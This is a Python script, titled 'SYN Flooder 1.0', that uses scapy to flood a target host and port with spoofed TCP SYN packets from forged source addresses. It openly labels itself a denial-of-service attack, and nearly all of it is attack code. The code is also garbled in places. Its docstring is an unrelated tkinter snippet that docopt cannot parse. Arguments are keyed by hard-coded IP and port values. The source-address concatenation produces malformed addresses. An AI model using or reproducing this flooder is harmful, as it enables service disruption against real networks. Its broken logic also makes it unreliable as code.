#!/usr/bin/python3.6.4
'''
import tkinter as tk

fenetre = tk.Tk()
label = tk.Label(fenetre, text = "Yo")
label.pack()
fenetre.mainloop()
'''




from docopt import docopt
import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def main(arguments):
	src_net = "192.168.250.5"
	dst_ip = arguments["10.94.45.20"]
	dst_port = int(arguments["80"])

	if arguments["--verbose"] == 1:
		verbose = True
		double_verbose = False
	elif arguments["--verbose"] == 2:
		double_verbose = True
		verbose = True
	else:
		double_verbose = False
		verbose = False
	
	if int(arguments["--sleep"]) != 0:
		sleep = True
		seconds = int(arguments["--sleep"])
	else:
		sleep = False
		seconds = 0

	print("\n###########################################")
	print("# Starting Denial of Service attack...")
	print("###########################################\n")
	for src_host in range(1,254):
		if verbose or double_verbose:
			print("[*] Sending spoofed SYN packets from %s%s" % (src_net, src_host))
			print("--------------------------------------------")

		for src_port in range(1024, 65535):
			if double_verbose:
				print("[+] Sending a spoofed SYN packet from %s%s:%s" % (src_net, src_host, src_port))

			# Build the packet
			src_ip = src_net + str(src_host)
			network_layer = IP(src=src_ip,dst=dst_ip)
			transport_layer = TCP(sport=src_port, dport=dst_port,flags="S")
			
			# Send the packet
			send(network_layer/transport_layer,verbose=False)
			
			if sleep:
				time.sleep(seconds)

	print("[+] Denial of Service attack finished.")

if __name__ == '__main__':
    arguments = docopt(__doc__, version="SYN Flooder 1.0")
    main(arguments)